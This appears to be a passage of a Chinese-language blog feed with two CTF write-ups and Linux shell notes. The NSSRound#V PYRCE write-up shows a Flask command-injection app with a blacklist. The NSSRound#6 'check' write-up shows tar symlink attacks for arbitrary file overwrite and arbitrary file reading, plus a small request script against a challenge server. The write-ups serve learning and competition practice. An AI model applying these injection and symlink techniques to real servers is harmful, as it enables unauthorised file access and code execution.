        <content type="html"><![CDATA[<h1 id="NSSRound-V-Team-PYRCE"><a href="#NSSRound-V-Team-PYRCE" class="headerlink" title="[NSSRound#V Team]PYRCE"></a>[NSSRound#V Team]PYRCE</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag in /flag</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">rce</span>):</span><br><span class="line">    black_list = <span class="string">&#x27;01233456789un/|&#123;&#125;*!;@#\n`~\&#x27;\&quot;&gt;&lt;=+-_ &#x27;</span></span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> rce:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&quot;Ňśś&quot;</span>):</span><br><span class="line">        nss = request.args.get(<span class="string">&quot;Ňśś&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> waf(nss):</span><br><span class="line">            os.popen(nss)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;waf&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/source&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    src = <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> src</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>思路一，用&#x2F;flag覆盖app.py文件，再访问&#x2F;source路由</p><p>这里覆盖完了之后，还可以访问路由的原因是<code>debug=False</code>，所以即使覆盖了app.py文件，但是flask运行所使用的文件并没有受到影响。</p><p>而如果<code>debug=True</code>，当我们修改文件时，flask就会自动重载文件。</p><p>此时覆盖flask运行文件（我本地是pyrce.py）</p><p>控制台</p><p><img src="/../images/image-20221022132313611-1686150585118.png" alt="image-20221022132313611"></p><p>访问&#x2F;source路由</p><p><img src="/../images/image-20221022132349822-1686150585118.png" alt="image-20221022132349822"></p><p>思路二，利用可以访问静态文件，先创建static目录（flask框架结构，静态文件放在static目录下），再将flag复制到static目录，访问&#x2F;static&#x2F;flag就能够下载flag文件。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSRound 6</title>
      <link href="/2023/05/31/NSSRound6/"/>
      <url>/2023/05/31/NSSRound6/</url>
      
        <content type="html"><![CDATA[<h1 id="NSSRound-6-Team-check"><a href="#NSSRound-6-Team-check" class="headerlink" title="[NSSRound#6 Team]check"></a>[NSSRound#6 Team]check</h1><h2 id="V1–任意文件上传"><a href="#V1–任意文件上传" class="headerlink" title="V1–任意文件上传"></a>V1–任意文件上传</h2><blockquote><p>服务端对上传的压缩包进行解压操作，并且没有对压缩包内容进行检查，导致可以通过符号链接达到任意覆盖&#x2F;上传文件的效果。</p></blockquote><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>假设我们要覆盖&#x2F;home&#x2F;khaz&#x2F;shell目录下的1.sh文件</p><p><img src="/../images/image-20221020234420015-1686150537835.png" alt="image-20221020234420015"></p><p>那么我们首先可以先创建一个软链接指向这个目录，并将其打包成压缩包1。</p><p><img src="/../images/image-20221020234340481-1686150537835.png" alt="image-20221020234340481"></p><p>然后我们需要再创建一个与软链接名字相同的目录，并在这个目录下创建要覆盖的文件。然后将该目录打包为压缩包2。</p><p><img src="/../images/image-20221020234743494-1686150537835.png" alt="image-20221020234743494"></p><p>然后解压压缩包1，得到test，然后解压压缩包2，其中test&#x2F;clean.sh，因为当前目录下test是指向&#x2F;home&#x2F;khaz&#x2F;shell的，所以实际上会将clean.sh解压到&#x2F;home&#x2F;khaz&#x2F;shell下从而覆盖原来的clean.sh。</p><p><img src="/../images/image-20221020234513190-1686150537835.png" alt="image-20221020234513190"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">        tar = tarfile.<span class="built_in">open</span>(file_save_path, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        tar.extractall(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clean&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_file</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;/tmp/clean.sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>做的时候，发现反弹shell不生效，在本地测试后发现是因为没有给clean.sh权限，所以覆盖后就不能执行了。</p><p><img src="/../images/Snipaste_2022-10-21_18-51-12-1686150537835.png" alt="Snipaste_2022-10-21_18-51-12"></p><p>ps：这里还有一个思路就是既然可以任意上传&#x2F;覆盖文件，那么可以直接覆盖app.py文件。</p><p>​这是因为每次修改工作目录下的文件，flask都会自动重载文件。</p><p><img src="/../images/image-20221021202646267-1686150537835.png" alt="image-20221021202646267"></p><h2 id="V2–任意文件下载"><a href="#V2–任意文件下载" class="headerlink" title="V2–任意文件下载"></a>V2–任意文件下载</h2><blockquote><p>服务端对上传的压缩包进行解压操作，并且没有对压缩包内容进行检查，并提供下载功能。导致解压出来的文件如果是符号链接文件就可以下载任意文件。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    filename = request.form.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filepath) <span class="keyword">or</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clean&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_file</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;su ctf -c /tmp/clean.sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>与v1相比不同点在于<code>su ctf -c /tmp/clean.sh</code>限制了用户权限，但是flask还是以root权限启动的，所以下载功能还是root权限。</p><p>构造符号链接指向<code>/flag</code>，利用下载功能就能够读取到flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.142.108.3:28187/download&quot;</span></span><br><span class="line"></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;filename&quot;</span>: <span class="string">&quot;test2&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url,data=params).text</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>《Linux命令行与shell脚本编程大全》 笔记</title>
      <link href="/2023/05/31/linux-shell/"/>
      <url>/2023/05/31/linux-shell/</url>
      
        <content type="html"><![CDATA[<p>前言：</p><p>以下内容为阅读<code>Linux命令行与shell脚本编程大全.第3版 (布鲁姆，布雷斯纳汉) (z-lib.org)</code>笔记。</p><p>注：下面使用的linux系统为阿里云服务器Centos7（redhat）或者kali（debian）系统</p><hr><h1 id="了解shell"><a href="#了解shell" class="headerlink" title="了解shell"></a>了解shell</h1><h3 id="shell类型"><a href="#shell类型" class="headerlink" title="shell类型"></a>shell类型</h3><p><img src="/../images/image-20220818151112756-1686151304118.png" alt="image-20220818151112756"></p><blockquote><p>当用户登录终端的时候，通常会启动一个默认的交互式shell。</p><p>系统究竟启动哪个shell，这取决于用户ID配置系统启动什么样的shell程序。</p><p>在&#x2F;etc&#x2F;passwd文件中，在用户ID记录的第7个字段中列出了默认的shell程序。</p></blockquote><p>例如在kali中登录终端时使用的是zsh类型的shell.</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line"></span><br><span class="line">khaz: x:1000:1000:khaz,,,:/home/khaz:/usr/bin/zsh</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(khaz㉿kali)-[~/桌面]</span><br><span class="line">└─$ ls -F /usr/bin/zsh</span><br><span class="line">/usr/bin/zsh*</span><br></pre></td></tr></table></figure><p>说明&#x2F;usr&#x2F;bin&#x2F;zsh是一个可执行程序</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(khaz㉿kali)-[~/桌面]</span><br><span class="line">└─$ ls -l /bin/sh</span><br><span class="line">lrwxrwxrwx 1 root root 4  3月 14  2022 /bin/sh -&gt; dash</span><br></pre></td></tr></table></figure><p>可以发现用户和系统使用的shell类型不同。</p><p>查看所有shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ cat /etc/shells</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/etc/shells: valid login shells</span></span><br><span class="line">/bin/sh</span><br><span class="line">/bin/bash</span><br><span class="line">/usr/bin/bash</span><br><span class="line">/bin/rbash</span><br><span class="line">/usr/bin/rbash</span><br><span class="line">/bin/dash</span><br><span class="line">/usr/bin/dash</span><br><span class="line">/usr/bin/tmux</span><br><span class="line">/usr/bin/screen</span><br><span class="line">/bin/zsh</span><br><span class="line">/usr/bin/zsh</span><br></pre></td></tr></table></figure><blockquote><p>通常说的sh只是一个软连接，并不是真的有一个shell叫sh。</p><p>在debian系操作系统中，sh指向dash；</p><p>在centos系操作系统中，sh指向bash。</p></blockquote><h3 id="shell的父子关系"><a href="#shell的父子关系" class="headerlink" title="shell的父子关系"></a>shell的父子关系</h3><p><img src="/../images/image-20220819202328859-1686151304119.png" alt="image-20220819202328859"></p><p>在右边的命令行中可以看到bash进程的ppid就是&#x2F;user&#x2F;bin&#x2F;zsh的pid，所以二者是父子关系。</p><img src="E:\typora img\image-20220819202343322.png" alt="image-20220819202343322" style="zoom: 80%;" /><p>多次创建bash</p><img src="E:\typora img\image-20220819203036919.png" alt="image-20220819203036919" style="zoom: 67%;" /><img src="E:\typora img\image-20220819203046906.png" alt="image-20220819203046906" style="zoom:67%;" /><p>退出当前shell，<code>exit</code></p><img src="E:\typora img\image-20220819203202199.png" alt="image-20220819203202199" style="zoom:67%;" /><p>启动shell时的参数</p><img src="E:\typora img\image-20220923170946734.png" alt="image-20220923170946734" style="zoom:67%;" title=1/><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ bash -r</span><br><span class="line">khaz@DESKTOP-JCNAFF7:~$ cd ../</span><br><span class="line">bash: cd: restricted</span><br><span class="line">khaz@DESKTOP-JCNAFF7:~$</span><br></pre></td></tr></table></figure><h3 id="命令列表"><a href="#命令列表" class="headerlink" title="命令列表"></a>命令列表</h3><blockquote><p>以;隔开的多个命令</p></blockquote><p><code>pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls ; echo $BASH_SUBSHELL</code></p><p>进程列表</p><blockquote><p>创建一个子shell来执行命令列表</p></blockquote><p><code> (pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls ; echo $BASH_SUBSHELL)</code></p><p><code>echo $BASH_SUBSHELL</code>：输出子shell数量</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]#  (pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls ; echo $BASH_SUBSHELL)</span><br><span class="line">/root</span><br><span class="line">H1ve  web</span><br><span class="line">/etc</span><br><span class="line">/root</span><br><span class="line">H1ve  web</span><br><span class="line">1</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ( pwd ; echo $BASH_SUBSHELL)</span><br><span class="line">/root</span><br><span class="line">1</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ( pwd ;(echo $BASH_SUBSHELL))</span><br><span class="line">/root</span><br><span class="line">2</span><br></pre></td></tr></table></figure><p>可以看出有几个括号就有几个子shell</p><h1 id="使用linux环境变量"><a href="#使用linux环境变量" class="headerlink" title="使用linux环境变量"></a>使用linux环境变量</h1><ul><li><p>定义</p><blockquote><p><strong>存储有关shell会话和工作环境的信息的变量称为环境变量</strong></p></blockquote></li><li><p>分类</p><ul><li><p>全局变量</p></li><li><p>局部变量</p><blockquote><p>这里的范围指的是变量存在于哪些shell会话中</p></blockquote></li></ul></li></ul><h3 id="全局环境变量"><a href="#全局环境变量" class="headerlink" title="全局环境变量"></a>全局环境变量</h3><blockquote><p>系统环境变量基本上都是使用全大写字母，以区别于普通用户的环境变量。</p></blockquote><p>查看全局变量</p><ul><li><p><code>env</code> 或者<code>printenv</code>：<strong>只</strong>输出全部的<strong>全局</strong>变量</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# env  (printenv输出的与其相同)</span><br><span class="line">XDG_SESSION_ID=897</span><br><span class="line">HOSTNAME=izwz99bgx9y93dmv0mir0ez</span><br><span class="line">TERM=xterm</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">HISTSIZE=1000</span><br><span class="line">SSH_TTY=/dev/pts/0</span><br><span class="line">USER=root</span><br><span class="line">....</span><br></pre></td></tr></table></figure></li><li><p><code>printenv  var_name</code>或者 <code>echo $var_name</code>：输出特定变量的值。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# printenv USER</span><br><span class="line">root</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $USER</span><br><span class="line">root</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p>全局环境变量存在于所有的shell会话中</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# bash</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ps -f</span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">root     11337 11335  0 20:14 pts/0    00:00:00 -bash</span><br><span class="line">root     11371 11337  0 20:31 pts/0    00:00:00 bash</span><br><span class="line">root     11382 11371  0 20:31 pts/0    00:00:00 ps -f</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $HOME</span><br><span class="line">/root</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# exit</span><br><span class="line">exit</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ps -f</span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">root     11337 11335  0 20:14 pts/0    00:00:00 -bash</span><br><span class="line">root     11383 11337  0 20:32 pts/0    00:00:00 ps -f</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $HOME</span><br><span class="line">/root</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>在这个例子中，用bash命令生成一个子shell后，显示了HOME环境变量的当前值，这个值和父shell中的一模一样，都是&#x2F;root。</p></blockquote><h3 id="局部环境变量"><a href="#局部环境变量" class="headerlink" title="局部环境变量"></a>局部环境变量</h3><p>查看局部变量</p><blockquote><p>在Linux系统并没有一个只显示局部环境变量的命令。</p></blockquote><ul><li><p><code>set</code></p><blockquote><p>set命令会显示为某个特定进程设置的所有环境变量，包括局部变量、全局变量以及用户定义变量。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# set</span><br><span class="line">BASH=/bin/bash</span><br><span class="line">BASHOPTS=checkwinsize:cmdhist:expand_aliases:extquote:force_fignore:histappend:hostcomplete:interactive_comments:login_shell:progcomp:promptvars:sourcepath</span><br><span class="line">BASH_ALIASES=()</span><br><span class="line">BASH_ARGC=()</span><br><span class="line">BASH_ARGV=()</span><br><span class="line">BASH_CMDS=()</span><br><span class="line">BASH_LINENO=()</span><br><span class="line">BASH_SOURCE=()</span><br><span class="line">BASH_VERSINFO=([0]=&quot;4&quot; [1]=&quot;2&quot; [2]=&quot;46&quot; [3]=&quot;2&quot; [4]=&quot;release&quot; [5]=&quot;x86_64-redhat-linux-gnu&quot;)</span><br><span class="line">BASH_VERSION=&#x27;4.2.46(2)-release&#x27;</span><br><span class="line">COLUMNS=210</span><br><span class="line">DIRSTACK=()</span><br><span class="line">EUID=0</span><br><span class="line">GROUPS=()</span><br><span class="line">....</span><br></pre></td></tr></table></figure><blockquote><p>set命令会显示出全局变量、局部变量以及用户定义变量。它还会按照字母顺序对结果进行排序。</p><p>env和printenv命令同set命令的区别在于前两个命令不会对变量排序，也不会输出局部变量和用户定义变量。</p></blockquote></li></ul><h3 id="设置局部用户自定义变量"><a href="#设置局部用户自定义变量" class="headerlink" title="设置局部用户自定义变量"></a>设置局部用户自定义变量</h3><blockquote><p>一旦启动了bash shell（或者执行一个shell脚本），就能创建在这个shell进程内可见的局部变量了。</p><p>可以通过等号给环境变量赋值，值可以是数值或字符串。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $first_var</span><br><span class="line"></span><br><span class="line">注：因为没有定义first_var变量，所以输出为空。</span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# $first_var=hello world</span><br><span class="line">-bash: =hello: command not found</span><br><span class="line">注：定义变量时无需加上$</span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# first_var=hello world</span><br><span class="line">-bash: world: command not found</span><br><span class="line">注：在为变量赋值字符串时，如果字符串有引号，就需要用单引号括起来。</span><br><span class="line">引用：没有单引号的话，bash shell会以为下一个词是另一个要执行的命令</span><br><span class="line"></span><br><span class="line">root@izwz99bgx9y93dmv0mir0ez ~]# first_var =&#x27;hello world&#x27;</span><br><span class="line">-bash: first_var: command not found</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# first_var= &#x27;hello world&#x27;</span><br><span class="line">-bash: hello world: command not found</span><br><span class="line">注：变量和=和值之间不能有空格，否则shell会把其当成命令。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# first_var=&#x27;hello world&#x27;</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $first_var</span><br><span class="line">hello world</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>局部变量的范围</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ps -f</span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">root     11337 11335  0 20:14 pts/0    00:00:00 -bash</span><br><span class="line">root     11415 11337  0 20:57 pts/0    00:00:00 ps -f</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# bash</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# child_var=&#x27;hello khaz&#x27;</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $child_var</span><br><span class="line">hello khaz</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# exit</span><br><span class="line">exit</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $child_var</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="设置全局变量"><a href="#设置全局变量" class="headerlink" title="设置全局变量"></a>设置全局变量</h3><blockquote><p>创建全局环境变量的方法是先<strong>创建</strong>一个局部环境变量，然后再把它<strong>导出</strong>到全局环境中。</p></blockquote><p><code>export var_name</code>：导出子shell的局部变量到全局环境中（<strong>临时修改</strong>）</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ps --forest</span><br><span class="line">  PID TTY          TIME CMD</span><br><span class="line">11566 pts/1    00:00:00 bash</span><br><span class="line">11585 pts/1    00:00:00  \_ ps</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# a=&#x27;khaz&#x27;</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# bash</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $a</span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# exit</span><br><span class="line">exit</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# export a</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# bash</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $a</span><br><span class="line">khaz</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>我发现只能在登录终端的那个shell中export，不能在子shell中export？</p><p>因为export的作用是让子shell可以继承父shell导出过的变量。</p><p>并且如果在子shell中修改全局变量的值，也不会影响到父shell中该全局变量的值。</p></blockquote><h3 id="删除环境变量"><a href="#删除环境变量" class="headerlink" title="删除环境变量"></a>删除环境变量</h3><p><code>unset var_name</code>：删除环境变量</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# a=1</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $a</span><br><span class="line">1</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# unset a</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $a</span><br></pre></td></tr></table></figure><h3 id="设置PATH环境变量"><a href="#设置PATH环境变量" class="headerlink" title="设置PATH环境变量"></a>设置PATH环境变量</h3><blockquote><p>PATH环境变量定义了用于进行命令和程序查找的目录。</p></blockquote><p>下面演示了创建自定义命令，并可以在任何路径下使用该命令。</p><ul><li><p>创建自定义命令，命令内容为输出’hello khaz’，并将其移动到存放自定义命令的目录下</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# vim hello </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo &#x27;hello khaz&#x27;</span><br><span class="line">:wq</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# mkdir my_cmd</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# mv hello my_cmd/</span><br></pre></td></tr></table></figure></li><li><p>因为与命令不在同一路径下，提示找不到命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# hello</span><br><span class="line">-bash: hello: command not found</span><br></pre></td></tr></table></figure></li><li><p>查看并增加PATH（路径以：分隔）</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $PATH</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# PATH=$PATH:/root/my_cmd/</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $PATH</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin:/root/my_cmd/</span><br></pre></td></tr></table></figure></li><li><p>再次输入命令成功执行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# hello</span><br><span class="line">hello khaz</span><br></pre></td></tr></table></figure><blockquote><p>这种方法对PATH变量的修改只能持续到退出或重启系统。</p></blockquote></li></ul><h3 id="让环境变量的作用持久化"><a href="#让环境变量的作用持久化" class="headerlink" title="让环境变量的作用持久化"></a>让环境变量的作用持久化</h3><blockquote><p>把我们设置的环境变量放在shell的启动文件&#x2F;环境文件中。</p><p>或者开机启动项<code>/etc/init.d/</code>和<code>/etc/profile.d/</code></p></blockquote><ul><li><p>启动文件&#x2F;环境文件</p><blockquote><p>登入Linux系统启动一个bash shell时，默认情况下bash会在几个文件中查找命令。</p><p>这些文件叫作启动文件或环境文件。</p></blockquote></li><li><p>5个不同的启动文件</p><p> &#x2F;etc&#x2F;profile </p><p> $HOME&#x2F;.bash_profile </p><p> $HOME&#x2F;.bashrc </p><p> $HOME&#x2F;.bash_login </p><p> $HOME&#x2F;.profile </p></li><li><p>&#x2F;etc&#x2F;profile文件</p><blockquote><p>&#x2F;etc&#x2F;profile文件是bash shell默认的的主启动文件。</p><p>只要你登录了Linux系统，bash就会执行&#x2F;etc&#x2F;profile启动文件中的命令。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat /etc/profile</span><br><span class="line">.....</span><br><span class="line">.....</span><br><span class="line">for i in /etc/profile.d/*.sh ; do</span><br><span class="line">    if [ -r &quot;$i&quot; ]; then</span><br><span class="line">        if [ &quot;$&#123;-#*i&#125;&quot; != &quot;$-&quot; ]; then </span><br><span class="line">            . &quot;$i&quot;</span><br><span class="line">        else</span><br><span class="line">            . &quot;$i&quot; &gt;/dev/null</span><br><span class="line">        fi</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line">....</span><br><span class="line">....</span><br></pre></td></tr></table></figure><blockquote><p>其中的for语句为Linux系统提供了一个放置特定应用程序启动文件的地方，当用户登录时，shell会执行这些文件。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ls -al /etc/profile.d/</span><br><span class="line">total 64</span><br><span class="line">drwxr-xr-x.  2 root root 4096 Oct 15  2017 .</span><br><span class="line">drwxr-xr-x. 82 root root 4096 Sep 24 23:07 ..</span><br><span class="line">-rw-r--r--.  1 root root  123 Jul 31  2015 less.csh</span><br><span class="line">-rw-r--r--.  1 root root  121 Jul 31  2015 less.sh</span><br><span class="line">-rw-r--r--   1 root root  105 Aug  2  2017 vim.csh</span><br><span class="line">-rw-r--r--   1 root root  269 Aug  2  2017 vim.sh</span><br><span class="line">-rw-r--r--.  1 root root  164 Jan 28  2014 which2.csh</span><br><span class="line">-rw-r--r--.  1 root root  169 Jan 28  2014 which2.sh</span><br><span class="line">-rw-r--r--. 1 root root 1741 Feb 20 05:44 lang.csh </span><br><span class="line">-rw-r--r--. 1 root root 2706 Feb 20 05:44 lang.sh</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><blockquote><p>不难发现，有些文件与系统中的特定应用有关。</p><p>大部分应用都会创建两个启动文件：一个供bash shell使用（使用.sh扩展名），一个供c 